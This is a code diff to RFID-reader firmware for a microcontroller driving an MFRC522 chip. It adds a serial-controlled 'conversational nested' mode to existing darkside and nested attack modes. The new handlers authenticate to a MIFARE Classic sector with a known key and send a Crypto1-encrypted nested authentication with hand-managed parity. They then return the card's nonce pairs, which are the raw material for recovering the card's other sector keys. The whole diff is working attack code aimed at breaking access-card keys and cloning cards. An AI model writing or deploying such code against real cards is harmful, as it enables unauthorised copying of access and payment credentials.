@@ -14,6 +14,7 @@
 #define MODE_WRITE_BLK0 4
 #define MODE_DARKSIDE   5
 #define MODE_NESTED     6
+#define MODE_NESTED_CONV 7
 
 // Print chip type and cloneability based on SAK byte (human-readable)
 static void print_chip_info(uint8_t sak) {
@@ -470,6 +471,16 @@ static uint8_t nested_known_block;
 static uint8_t nested_target_block;
 static uint8_t nested_key[6];
 
+// Persistent conversational nested session state
+static uint8_t  conv_authed = 0;           // 0=idle, 1=authenticated
+static crypto1_state conv_cs;              // LFSR state after auth
+static uint8_t  conv_uid[4];              // UID from last auth (4 bytes, no BCC)
+static uint8_t  conv_nt[4];               // nonce from last auth
+static uint8_t  conv_auth_block;           // block we authenticated to
+// Line buffer for conversational nested commands
+static char     conv_buf[32];
+static uint8_t  conv_buf_pos = 0;
+
 static uint8_t parse_hex_byte(const char *s) {
     uint8_t hi = hex_char_to_val(s[0]);
     uint8_t lo = hex_char_to_val(s[1]);
@@ -732,6 +743,143 @@ static void do_darkside_round(void) {
     _delay_ms(25);
 }
 
+// ── Conversational Nested Protocol Handlers ──
+
+// Handle NA (Nested Auth) command
+// Format: NA:<block_hex>:<key_12hex>:<A|B>
+// Example: NA:00:FFFFFFFFFFFF:B
+static void cmd_na(const char *args) {
+    // Parse block (2 hex chars)
+    uint8_t block = parse_hex_byte(args);
+    if (args[2] != ':') { uart_puts("NA:ERR:PARSE\r\n"); return; }
+
+    // Parse key (12 hex chars)
+    uint8_t key[6];
+    const char *kp = args + 3;
+    for (uint8_t i = 0; i < 6; i++) {
+        key[i] = parse_hex_byte(kp + i * 2);
+    }
+    if (kp[12] != ':') { uart_puts("NA:ERR:PARSE\r\n"); return; }
+
+    // Parse key type
+    char kt = kp[13];
+    uint8_t auth_type;
+    if (kt == 'A') auth_type = PICC_AUTHKA;
+    else if (kt == 'B') auth_type = PICC_AUTHKB;
+    else { uart_puts("NA:ERR:KEYTYPE\r\n"); return; }
+
+    // If already authed, halt first (auto-cleanup)
+    if (conv_authed) {
+        mfrc522_halt();
+        conv_authed = 0;
+    }
+
+    // Perform software auth
+    uint8_t status = manual_auth(block, key, conv_uid, conv_nt, &conv_cs,
+                                  auth_type, 250);
+    if (status == MI_OK) {
+        conv_authed = 1;
+        conv_auth_block = block;
+        uart_puts("NA:OK:");
+        for (uint8_t i = 0; i < 4; i++) uart_put_hex(conv_uid[i]);
+        uart_putc(':');
+        for (uint8_t i = 0; i < 4; i++) uart_put_hex(conv_nt[i]);
+        uart_puts("\r\n");
+    } else {
+        conv_authed = 0;
+        uart_puts("NA:FAIL\r\n");
+    }
+}
+
+// Handle NP (Nested Probe) command
+// Format: NP:<target_block_hex>
+// Example: NP:14
+static void cmd_np(const char *args) {
+    if (!conv_authed) {
+        uart_puts("NP:ERR:NOAUTH\r\n");
+        return;
+    }
+
+    uint8_t target_block = parse_hex_byte(args);
+
+    // Build encrypted AUTH command for target block
+    uint8_t auth_cmd[4];
+    auth_cmd[0] = PICC_AUTHKA;
+    auth_cmd[1] = target_block;
+    mfrc522_calculate_crc(auth_cmd, 2, &auth_cmd[2]);
+
+    // Encrypt byte-by-byte with parity clocking
+    uint8_t enc_cmd[4];
+    uint8_t parity_ok = 1;
+    for (uint8_t i = 0; i < 4; i++) {
+        uint8_t ks = crypto1_byte(&conv_cs, auth_cmd[i], 0);
+        enc_cmd[i] = auth_cmd[i] ^ ks;
+        uint8_t wire_par = odd_parity8(enc_cmd[i]);
+        uint8_t ks_par = crypto1_bit(&conv_cs, wire_par, 1);
+        if (odd_parity8(ks) != ks_par) {
+            parity_ok = 0;
+            break;
+        }
+    }
+
+    if (!parity_ok) {
+        // Auto-parity won't match crypto parity — must re-auth
+        mfrc522_halt();
+        conv_authed = 0;
+        uart_puts("NP:RETRY\r\n");
+        return;
+    }
+
+    // Send encrypted auth command
+    mfrc522_clear_bit(TxModeReg, 0x80);
+    mfrc522_clear_bit(RxModeReg, 0x80);
+
+    uint8_t nt_target[4];
+    uint8_t back_len;
+    uint8_t status = mfrc522_to_card(PCD_Transceive, enc_cmd, 4,
+                                      nt_target, &back_len);
+
+    mfrc522_set_bit(TxModeReg, 0x80);
+    mfrc522_set_bit(RxModeReg, 0x80);
+
+    if (status != MI_OK || back_len != 32) {
+        mfrc522_halt();
+        conv_authed = 0;
+        uart_puts("NP:RETRY\r\n");
+        return;
+    }
+
+    // Success! Send nonce pair
+    uart_puts("NP:NT:");
+    for (uint8_t i = 0; i < 4; i++) uart_put_hex(conv_nt[i]);
+    uart_putc(':');
+    for (uint8_t i = 0; i < 4; i++) uart_put_hex(nt_target[i]);
+    uart_puts("\r\n");
+
+    // Session consumed — card needs re-auth
+    mfrc522_halt();
+    conv_authed = 0;
+}
+
+// Handle NH (Nested Halt) command — halt card, end session
+static void cmd_nh(void) {
+    if (conv_authed) {
+        mfrc522_halt();
+        conv_authed = 0;
+    }
+    uart_puts("NH:OK\r\n");
+}
+
+// Handle NX (Nested Abort) command — emergency stop
+static void cmd_nx(void) {
+    mfrc522_halt();
+    conv_authed = 0;
+    conv_buf_pos = 0;
+    uart_puts("NX:OK\r\n");
+}
+
+// ── End Conversational Nested Protocol ──
+
 static void do_nested_collect(void) {
     uint8_t uid[5];
     uint8_t nt_known[4];
@@ -924,6 +1072,13 @@ int main(void) {
                     }
                     uart_puts("OK:NESTED_START\r\n");
                     break;
+                case 'C':
+                    // Enter conversational nested mode
+                    conv_authed = 0;
+                    conv_buf_pos = 0;
+                    scan_mode = MODE_NESTED_CONV;
+                    uart_puts("OK:CONV_START\r\n");
+                    break;
                 }
             }
         }
@@ -965,6 +1120,37 @@ int main(void) {
                 nested_rounds = 0;
             }
             _delay_ms(10);
+            continue;
+        }
+
+        if (scan_mode == MODE_NESTED_CONV) {
+            if (uart_available()) {
+                char c = uart_getc();
+                if (c == '\r' || c == '\n') {
+                    if (conv_buf_pos > 0) {
+                        conv_buf[conv_buf_pos] = '\0';
+                        // Parse and dispatch command
+                        if (conv_buf[0] == 'N' && conv_buf[1] == 'A' &&
+                            conv_buf[2] == ':' && conv_buf_pos >= 18) {
+                            cmd_na(conv_buf + 3);
+                        } else if (conv_buf[0] == 'N' && conv_buf[1] == 'P' &&
+                                   conv_buf[2] == ':' && conv_buf_pos >= 5) {
+                            cmd_np(conv_buf + 3);
+                        } else if (conv_buf[0] == 'N' && conv_buf[1] == 'H') {
+                            cmd_nh();
+                        } else if (conv_buf[0] == 'N' && conv_buf[1] == 'X') {
+                            cmd_nx();
+                            scan_mode = MODE_IDLE;
+                        } else {
+                            uart_puts("ERR:UNKNOWN_CMD\r\n");
+                        }
+                        conv_buf_pos = 0;
+                    }
+                } else if (conv_buf_pos < sizeof(conv_buf) - 1) {
+                    conv_buf[conv_buf_pos++] = c;
+                }
+            }
+            _delay_ms(1);
             continue;
         }
 
